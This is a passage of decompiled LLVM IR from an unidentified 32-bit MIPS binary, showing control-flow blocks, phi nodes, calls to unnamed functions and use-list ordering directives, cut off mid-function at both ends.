  %v3_403b38 = call i32 @function_403f48()
  store i32 %v3_403b38, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403b44 = load i32, i32* @s0, align 4
  store i32 %v0_403b44, i32* %a0.global-to-local, align 4
  %v3_403b48 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403b48, i32* @t9, align 4
  %v7_403b54 = call i32 @function_405f30(i32 %v0_403b44, i32* nonnull %stack_var_-1092, i32 %v3_403b38, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403b54, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403b64 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_403b64, i32* %v1.global-to-local, align 4
  %v1_403b68 = icmp sgt i32 %v7_403b54, 0
  br i1 %v1_403b68, label %dec_label_pc_403a80.dec_label_pc_403b80_crit_edge, label %dec_label_pc_403b70

dec_label_pc_403a80.dec_label_pc_403b80_crit_edge: ; preds = %dec_label_pc_403a80
  %v0_403b84.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_403b80

dec_label_pc_403b70:                              ; preds = %dec_label_pc_403478.dec_label_pc_403b70_crit_edge, %dec_label_pc_403a80, %dec_label_pc_4039a8, %dec_label_pc_4038d8
  %.pre60.pre-phi = phi i32 [ %.pre61, %dec_label_pc_403478.dec_label_pc_403b70_crit_edge ], [ %v2_4038a4.pre-phi, %dec_label_pc_403a80 ], [ %v2_4038a4.pre-phi, %dec_label_pc_4039a8 ], [ %v2_4038a4.pre-phi, %dec_label_pc_4038d8 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.1, %dec_label_pc_403478.dec_label_pc_403b70_crit_edge ], [ %stack_var_-48.2, %dec_label_pc_403a80 ], [ %stack_var_-48.2, %dec_label_pc_4039a8 ], [ %stack_var_-48.2, %dec_label_pc_4038d8 ]
  %v0_403b74 = load i32, i32* @s3, align 4
  store i32 %v0_403b74, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403b80

dec_label_pc_403b80:                              ; preds = %dec_label_pc_403a80.dec_label_pc_403b80_crit_edge, %dec_label_pc_403b70
  %v2_403b94.pre-phi = phi i32 [ %v2_4038a4.pre-phi, %dec_label_pc_403a80.dec_label_pc_403b80_crit_edge ], [ %.pre60.pre-phi, %dec_label_pc_403b70 ]
  %v0_403b84 = phi i32 [ %v0_403b84.pre, %dec_label_pc_403a80.dec_label_pc_403b80_crit_edge ], [ %v0_403b74, %dec_label_pc_403b70 ]
  %stack_var_-48.4 = phi i32 [ %stack_var_-48.2, %dec_label_pc_403a80.dec_label_pc_403b80_crit_edge ], [ %stack_var_-48.3, %dec_label_pc_403b70 ]
  store i32 %v0_403b84, i32* %a0.global-to-local, align 4
  %v1_403b90 = add i32 %v1_4028f0, 291824
  %v2_403b90 = inttoptr i32 %v1_403b90 to i32*
  %v3_403b90 = load i32, i32* %v2_403b90, align 4
  store i32 %v2_403b94.pre-phi, i32* %s1.global-to-local, align 4
  store i32 %v2_403b94.pre-phi, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403b90)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403bb0 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_403bb0, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403bb8 = call i32 @function_4002d0(i32 22)
  store i32 %v2_403bb8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403bc8 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_403bc8, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403bd0 = call i32 @function_400564(i32 22)
  store i32 %v2_403bd0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v3_403be0 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_403be0, i32* @t9, align 4
  store i32 %v2_403bd0, i32* %s0.global-to-local, align 4
  %v3_403be8 = call i32 @function_400564(i32 22)
  store i32 %v3_403be8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_403b94.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403bfc = load i32, i32* @global_var_449b8c.141, align 4
  store i32 %v3_403bfc, i32* @t9, align 4
  %v1_403c08 = load i32, i32* %s0.global-to-local, align 4
  %v6_403c08 = call i32 @function_404b90(i32 %v2_403b94.pre-phi, i32 ptrtoint ([852 x i8]* @global_var_409278.178 to i32), i32 %v1_403c08)
  store i32 %v6_403c08, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_403c18 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_403c18, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403c20 = call i32 @function_400418(i32 22)
  store i32 %v2_403c20, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403c34 = load i32, i32* @s3, align 4
  %v1_403c34 = add i32 %v0_403c34, 8
  %v2_403c34 = inttoptr i32 %v1_403c34 to i32*
  %v3_403c34 = load i32, i32* %v2_403c34, align 4
  store i32 %v3_403c34, i32* @s0, align 4
  store i32 %v2_403b94.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403c38 = call i32 @function_403f48()
  store i32 %v3_403c38, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_403c44 = load i32, i32* @s0, align 4
  store i32 %v0_403c44, i32* %a0.global-to-local, align 4
  %v3_403c48 = load i32, i32* @global_var_449c80.106, align 4
  store i32 %v3_403c48, i32* @t9, align 4
  %v7_403c54 = call i32 @function_405f30(i32 %v0_403c44, i32* nonnull %stack_var_-1092, i32 %v3_403c38, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403c54, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_403c60 = icmp sgt i32 %v7_403c54, 0
  br i1 %v1_403c60, label %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge, label %dec_label_pc_403c68

dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge: ; preds = %dec_label_pc_403b80
  %v0_403c7c.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_403c7c

dec_label_pc_403c68:                              ; preds = %dec_label_pc_403b80, %dec_label_pc_4031a8, %dec_label_pc_403100, %dec_label_pc_403904, %dec_label_pc_403894, %dec_label_pc_40382c, %dec_label_pc_40322c, %dec_label_pc_4032d4
  %stack_var_-48.5 = phi i32 [ %stack_var_-48.1, %dec_label_pc_4032d4 ], [ %stack_var_-48.0, %dec_label_pc_40322c ], [ %stack_var_-48.0, %dec_label_pc_4031a8 ], [ %stack_var_-48.0, %dec_label_pc_403100 ], [ %stack_var_-48.2, %dec_label_pc_403894 ], [ %stack_var_-48.4, %dec_label_pc_403b80 ], [ %stack_var_-48.2, %dec_label_pc_403904 ], [ %v0_403660, %dec_label_pc_40382c ]
  %stack_var_-64.2 = phi i32 [ %stack_var_-64.1, %dec_label_pc_4032d4 ], [ %stack_var_-64.0, %dec_label_pc_40322c ], [ %stack_var_-64.0, %dec_label_pc_4031a8 ], [ %stack_var_-64.0, %dec_label_pc_403100 ], [ %stack_var_-64.1, %dec_label_pc_403894 ], [ %stack_var_-64.1, %dec_label_pc_403b80 ], [ %stack_var_-64.1, %dec_label_pc_403904 ], [ %stack_var_-64.1, %dec_label_pc_40382c ]
  %stack_var_-56.4 = phi i32 [ %stack_var_-56.3, %dec_label_pc_4032d4 ], [ %stack_var_-56.2, %dec_label_pc_40322c ], [ %stack_var_-56.2, %dec_label_pc_4031a8 ], [ %stack_var_-56.2, %dec_label_pc_403100 ], [ %stack_var_-56.3, %dec_label_pc_403894 ], [ %stack_var_-56.3, %dec_label_pc_403b80 ], [ %stack_var_-56.3, %dec_label_pc_403904 ], [ %stack_var_-56.3, %dec_label_pc_40382c ]
  %stack_var_-52.4 = phi i32 [ %stack_var_-52.3, %dec_label_pc_4032d4 ], [ %stack_var_-52.2, %dec_label_pc_40322c ], [ %stack_var_-52.2, %dec_label_pc_4031a8 ], [ %stack_var_-52.2, %dec_label_pc_403100 ], [ %stack_var_-52.3, %dec_label_pc_403894 ], [ %stack_var_-52.3, %dec_label_pc_403b80 ], [ %stack_var_-52.3, %dec_label_pc_403904 ], [ %stack_var_-52.3, %dec_label_pc_40382c ]
  %v0_403c68 = load i32, i32* @s3, align 4
  store i32 %v0_403c68, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403c6c

dec_label_pc_403c6c:                              ; preds = %dec_label_pc_4037f0, %dec_label_pc_403638, %dec_label_pc_403c68
  %v0_403c7c45 = phi i32 [ %v0_403c68, %dec_label_pc_403c68 ], [ %v2_403738, %dec_label_pc_403638 ], [ %v2_403828, %dec_label_pc_4037f0 ]
  %stack_var_-48.6 = phi i32 [ %stack_var_-48.5, %dec_label_pc_403c68 ], [ %v0_403660, %dec_label_pc_403638 ], [ %v0_403660, %dec_label_pc_4037f0 ]
  %stack_var_-64.3 = phi i32 [ %stack_var_-64.2, %dec_label_pc_403c68 ], [ %stack_var_-64.1, %dec_label_pc_403638 ], [ %stack_var_-64.1, %dec_label_pc_4037f0 ]
  %stack_var_-56.5 = phi i32 [ %stack_var_-56.4, %dec_label_pc_403c68 ], [ %stack_var_-56.3, %dec_label_pc_403638 ], [ %stack_var_-56.3, %dec_label_pc_4037f0 ]
  %stack_var_-52.5 = phi i32 [ %stack_var_-52.4, %dec_label_pc_403c68 ], [ %stack_var_-52.3, %dec_label_pc_403638 ], [ %stack_var_-52.3, %dec_label_pc_4037f0 ]
  br label %dec_label_pc_403c7c

dec_label_pc_403c7c:                              ; preds = %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge, %dec_label_pc_403c6c
  %v0_403c7c = phi i32 [ %v0_403c7c45, %dec_label_pc_403c6c ], [ %v0_403c7c.pre, %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge ]
  %stack_var_-48.7 = phi i32 [ %stack_var_-48.6, %dec_label_pc_403c6c ], [ %stack_var_-48.4, %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge ]
  %stack_var_-64.4 = phi i32 [ %stack_var_-64.3, %dec_label_pc_403c6c ], [ %stack_var_-64.1, %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge ]
  %stack_var_-56.6 = phi i32 [ %stack_var_-56.5, %dec_label_pc_403c6c ], [ %stack_var_-56.3, %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge ]
  %stack_var_-52.6 = phi i32 [ %stack_var_-52.5, %dec_label_pc_403c6c ], [ %stack_var_-52.3, %dec_label_pc_403b80.dec_label_pc_403c7c_crit_edge ]
  store i32 %v0_403c7c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403c80

dec_label_pc_403c80:                              ; preds = %dec_label_pc_40373c, %dec_label_pc_403c7c
  %v0_403c90 = phi i32 [ %v0_403c7c, %dec_label_pc_403c7c ], [ %v2_403738, %dec_label_pc_40373c ]
  %stack_var_-48.8 = phi i32 [ %stack_var_-48.7, %dec_label_pc_403c7c ], [ %v0_403660, %dec_label_pc_40373c ]
  %stack_var_-64.5 = phi i32 [ %stack_var_-64.4, %dec_label_pc_403c7c ], [ %stack_var_-64.1, %dec_label_pc_40373c ]
  %stack_var_-56.7 = phi i32 [ %stack_var_-56.6, %dec_label_pc_403c7c ], [ %stack_var_-56.3, %dec_label_pc_40373c ]
  %stack_var_-52.7 = phi i32 [ %stack_var_-52.6, %dec_label_pc_403c7c ], [ %stack_var_-52.3, %dec_label_pc_40373c ]
  %v1_403c84 = add i32 %v1_4028f0, 291224
  %v2_403c84 = inttoptr i32 %v1_403c84 to i32*
  store i32 %v0_403c90, i32* %a0.global-to-local, align 4
  %v3_403c98 = load i32, i32* %v2_403c84, align 4
  %v1_403ca0 = add i32 %v3_403c98, 10344
  call void @__pseudo_call(i32 %v1_403ca0)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403cb0

dec_label_pc_403cb0:                              ; preds = %dec_label_pc_403758, %dec_label_pc_403074, %dec_label_pc_402e58, %dec_label_pc_403c80
  %stack_var_-48.9 = phi i32 [ %stack_var_-48.8, %dec_label_pc_403c80 ], [ %stack_var_-48.0, %dec_label_pc_402e58 ], [ %stack_var_-48.0, %dec_label_pc_403074 ], [ %v0_403660, %dec_label_pc_403758 ]
  %stack_var_-64.6 = phi i32 [ %stack_var_-64.5, %dec_label_pc_403c80 ], [ %stack_var_-64.0, %dec_label_pc_402e58 ], [ %stack_var_-64.0, %dec_label_pc_403074 ], [ %stack_var_-64.1, %dec_label_pc_403758 ]
  %stack_var_-56.8 = phi i32 [ %stack_var_-56.7, %dec_label_pc_403c80 ], [ %stack_var_-56.2, %dec_label_pc_402e58 ], [ %stack_var_-56.2, %dec_label_pc_403074 ], [ %stack_var_-56.3, %dec_label_pc_403758 ]
  %stack_var_-52.8 = phi i32 [ %stack_var_-52.7, %dec_label_pc_403c80 ], [ %stack_var_-52.2, %dec_label_pc_402e58 ], [ %stack_var_-52.2, %dec_label_pc_403074 ], [ %stack_var_-52.3, %dec_label_pc_403758 ]
  %v0_403cb4 = load i32, i32* @s3, align 4
  %v1_403cb4 = add i32 %v0_403cb4, 1048
  store i32 %v1_403cb4, i32* @s3, align 4
  %v1_403cb8 = add i32 %stack_var_-64.6, 1
  store i32 %v1_403cb8, i32* %v1.global-to-local, align 4
  %v1_403cc8 = load i32, i32* @s7, align 4
  %v2_403cc8 = icmp slt i32 %v1_403cb8, %v1_403cc8
  %v3_403cc8 = zext i1 %v2_403cc8 to i32
  store i32 %v3_403cc8, i32* %v0.global-to-local, align 4
  br i1 %v2_403cc8, label %dec_label_pc_402e58, label %dec_label_pc_403cdc

dec_label_pc_403cdc:                              ; preds = %dec_label_pc_4028e8.dec_label_pc_403cdc_crit_edge, %dec_label_pc_403cb0, %dec_label_pc_402944
  %v4_403d04 = phi i32 [ %v4_403d04.pre, %dec_label_pc_4028e8.dec_label_pc_403cdc_crit_edge ], [ %v3_403cc8, %dec_label_pc_403cb0 ], [ -1, %dec_label_pc_402944 ]
  store i32 %v0_402918, i32* @s1, align 4
  store i32 %v0_40291c, i32* @s0, align 4
  ret i32 %v4_403d04

; uselistorder directives
  uselistorder i32 %v1_403cb8, { 1, 2, 0 }
  uselistorder i32 %v1_403cb4, { 1, 0 }
  uselistorder i32 %stack_var_-48.4, { 1, 0 }
  uselistorder i32 %v2_403b94.pre-phi, { 3, 4, 2, 1, 0 }
  uselistorder i32 %stack_var_-48.2, { 4, 5, 0, 3, 1, 2 }
  uselistorder i32 %v2_4038a4.pre-phi, { 4, 1, 2, 3, 18, 16, 17, 14, 15, 13, 12, 10, 11, 8, 9, 7, 0, 6, 5 }
  uselistorder i32 %v0_4037c4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_403660, { 1, 4, 3, 5, 2, 0 }
  uselistorder i32 %v0_403638.pre, { 1, 0, 2 }
  uselistorder i32 %v3_4035a0, { 1, 2, 0 }
  uselistorder i32 %v2_403584, { 1, 0 }
  uselistorder i32 %v1_40356c, { 1, 0 }
  uselistorder i8* %v7_4034e8, { 0, 10, 1, 9, 2, 3, 8, 4, 7, 5, 6, 11 }
  uselistorder i32 %v2_4034c0, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22 }
  uselistorder i32 %v0_40348c, { 1, 0, 2 }
  uselistorder i32 %v3_403470, { 0, 2, 1 }
  uselistorder i32 %v6_40345c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_403428, { 1, 0, 2 }
  uselistorder i32 %v1_4033c0, { 1, 0 }
  uselistorder i32 %v0_4033ac, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_403360, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-52.3, { 0, 5, 9, 2, 6, 1, 7, 8, 10, 11, 3, 4 }
  uselistorder i32 %stack_var_-56.3, { 0, 3, 9, 2, 4, 1, 5, 8, 10, 11, 6, 7 }
  uselistorder i32 %stack_var_-64.1, { 0, 3, 7, 2, 4, 1, 5, 6, 8, 9 }
  uselistorder i32 %stack_var_-48.1, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v3_403284, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_403150, { 1, 0, 2 }
  uselistorder i32 %v1_403144, { 1, 2, 0 }
  uselistorder i32 %v5_403148, { 1, 0, 2 }
  uselistorder i32 %v0_403074, { 1, 0 }
  uselistorder i32 %v4_402fc4, { 1, 0 }
  uselistorder i32 %v3_402fa8, { 1, 0 }
  uselistorder i32 %v0_402f9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_402f54, { 2, 3, 4, 6, 5, 7, 9, 8, 0, 10, 1, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 %v1_402f4c, { 1, 0 }
  uselistorder i32 %v3_402e64, { 1, 0 }
  uselistorder i32 %stack_var_-52.2, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %stack_var_-56.2, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %stack_var_-64.0, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %stack_var_-48.0, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_402d80, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_402ce8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_402cc8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_402c90, { 1, 0, 3, 2, 4, 5 }
  uselistorder i8* %v7_402b7c, { 3, 0, 1, 4, 2, 5, 6 }
  uselistorder i32 %v1_402a50, { 1, 0 }
  uselistorder i32 %v2_402a38, { 1, 0, 2 }
  uselistorder i32 %v1_4029cc, { 2, 1, 0 }
  uselistorder i32 %., { 0, 1, 3, 2 }
  uselistorder i32 %v2_4028f0, { 7, 33, 32, 31, 30, 29, 28, 27, 26, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 25, 24, 23, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 22, 6, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 89, 0, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 121, 120, 119, 118, 117, 116, 115, 114, 113, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 88, 87, 5, 4, 3, 2, 1, 122 }
  uselistorder i32 %v1_4028f0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-1092, { 4, 5, 6, 7, 8, 9, 3, 11, 0, 1, 2, 12, 10, 13 }
  uselistorder i32* %stack_var_-2116, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-2312, { 2, 0, 1 }
  uselistorder i32* %stack_var_-2336, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-2332, { 2, 0, 1 }
  uselistorder i8* %stack_var_-2320, { 2, 0, 1 }
  uselistorder i32 %tmp78, { 0, 2, 1 }
  uselistorder i32 %tmp77, { 0, 2, 1 }
  uselistorder i32* %v1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 31, 32, 33, 34, 35, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30 }
  uselistorder i32* %v0.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 36, 38, 37, 39, 41, 40, 42, 44, 43, 45, 46, 50, 47, 48, 49, 51, 53, 52, 54, 56, 55, 57, 59, 58, 60, 61, 62, 147, 149, 148, 150, 151, 152, 2, 63, 1, 64, 65, 67, 66, 68, 69, 0, 75, 70, 71, 72, 73, 74, 76, 77, 78, 103, 80, 79, 81, 82, 84, 83, 86, 85, 87, 89, 88, 90, 91, 92, 94, 93, 95, 97, 96, 98, 99, 100, 101, 102, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 118, 117, 120, 119, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 136, 135, 137, 138, 139, 140, 141, 142, 146, 143, 144, 145 }
  uselistorder i32* %s4.global-to-local, { 0, 1, 5, 6, 7, 8, 2, 3, 4 }
  uselistorder i32* %s2.global-to-local, { 2, 0, 1, 3, 6, 7, 8, 4, 5 }
  uselistorder i32* %s1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 17, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 19, 20, 21, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 111, 57, 58, 59, 60, 61, 62, 63, 64, 65, 71, 66, 67, 68, 69, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 98, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 114, 115, 116, 117 }
  uselistorder i32* %a0.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 2, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 132, 1, 131, 133, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 0 }
  uselistorder i32 (i32)* @function_400418, { 4, 3, 2, 1, 0 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_408ba0.172 to i32*), { 1, 2, 0 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_4087a0.162 to i32), { 0, 2, 1, 3 }
  uselistorder i32 16384, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 11, 12, 18, 13, 19, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_405d70, { 1, 0 }
  uselistorder i32 65535, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @function_4051d0, { 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0 }
  uselistorder i32 65280, { 3, 1, 2, 0 }
  uselistorder i32 11, { 0, 5, 2, 6, 3, 7, 8, 4, 1 }
  uselistorder i32 192, { 1, 2, 0, 3 }
  uselistorder i8 1, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 17, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 1 }
  uselistorder i16 0, { 4, 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_404b90, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_4069b0, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_404030, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @s3, { 7, 8, 9, 2, 10, 11, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 5, 26, 27, 28, 29, 30, 31, 32, 33, 4, 34, 35, 36, 37, 38, 0, 39, 40, 41, 42, 43, 1, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 6, 55, 56 }
  uselistorder i32 1024, { 1, 10, 2, 11, 3, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 0, 9, 17 }
  uselistorder i32 ()* @function_403f48, { 23, 22, 21, 20, 19, 18, 17, 16, 15, 4, 3, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 2, 1 }
  uselistorder i32 (i32)* @function_401f28, { 1, 0 }
  uselistorder i32 (i32)* @function_400564, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 30, { 0, 3, 1, 4, 2 }
  uselistorder i32 29, { 1, 3, 2, 4, 0 }
  uselistorder i32 27, { 1, 3, 2, 4, 0 }
  uselistorder i32 (i32)* @function_4002d0, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 2054, { 1, 0, 2 }
  uselistorder i32 1048, { 1, 2, 0 }
  uselistorder i32 ()* @function_401e78, { 1, 0 }
  uselistorder i32 ()* @function_404e40, { 1, 0 }
  uselistorder i32* @s6, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_403cdc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_403cb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_403c80, { 1, 0 }
  uselistorder label %dec_label_pc_403c7c, { 1, 0 }
  uselistorder label %dec_label_pc_403c6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_403c68, { 0, 3, 4, 5, 7, 6, 1, 2 }
  uselistorder label %dec_label_pc_403b80, { 1, 0 }
  uselistorder label %dec_label_pc_403b70, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_4039a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_403894, { 1, 0 }
  uselistorder label %dec_label_pc_4037f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_403638, { 1, 0 }
  uselistorder label %dec_label_pc_4035b4, { 1, 0 }
  uselistorder label %dec_label_pc_4033bc, { 1, 0 }
  uselistorder label %dec_label_pc_4032d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_403294, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_403284.thread, { 1, 0 }
  uselistorder label %dec_label_pc_403270.thread, { 1, 0 }
  uselistorder label %dec_label_pc_403234, { 1, 0 }
  uselistorder label %dec_label_pc_40312c, { 1, 0 }
  uselistorder label %dec_label_pc_403074, { 1, 0 }
  uselistorder label %dec_label_pc_403034, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_402fd4, { 1, 0 }
  uselistorder label %dec_label_pc_402fc4, { 1, 0 }
  uselistorder label %dec_label_pc_402fb8, { 1, 0 }
  uselistorder label %dec_label_pc_402eb8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_402e0c, { 1, 0 }
  uselistorder label %dec_label_pc_402d70, { 1, 0 }
  uselistorder label %dec_label_pc_402d60, { 1, 0 }
  uselistorder label %dec_label_pc_402c5c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_4029e0, { 1, 0 }
}

define i32 @function_403d0c() local_unnamed_addr {
dec_label_pc_403d0c:
  %v3_403d18 = load i32, i32* bitcast (i32** @global_var_449c7c.181 to i32*), align 4
  %v3_403d1c = load i32, i32* @global_var_449c50.75, align 4
  store i32 %v3_403d1c, i32* @t9, align 4
  %v3_403d24 = call i32 @function_405010(i32 %v3_403d18, i32 9)
  ret i32 %v3_403d24
}

define i32 @function_403d2c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403d2c:
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %tmp12 = alloca i32, align 4
  %tmp13 = alloca i32, align 4
  %tmp14 = alloca i32, align 4
  %v1_403d34 = load i32, i32* @t9, align 4
  %v2_403d34 = add i32 %v1_403d34, 318772
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403d54 = load i32, i32* @global_var_449c00.97, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403d54)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v0_403d68 = load i32, i32* @v0, align 4
  store i32 %v0_403d68, i32* %v1.global-to-local, align 4
  %v3_403d6c = load i32, i32* bitcast (i32** @global_var_449c7c.181 to i32*), align 4
  %v2_403d74 = inttoptr i32 %v3_403d6c to i32*
  store i32 %v0_403d68, i32* %v2_403d74, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_403d7c = load i32, i32* %v1.global-to-local, align 4
  %v2_403d7c = icmp eq i32 %v0_403d7c, -1
  %v1_403d84 = icmp sgt i32 %v0_403d7c, 0
  %or.cond = or i1 %v2_403d7c, %v1_403d84
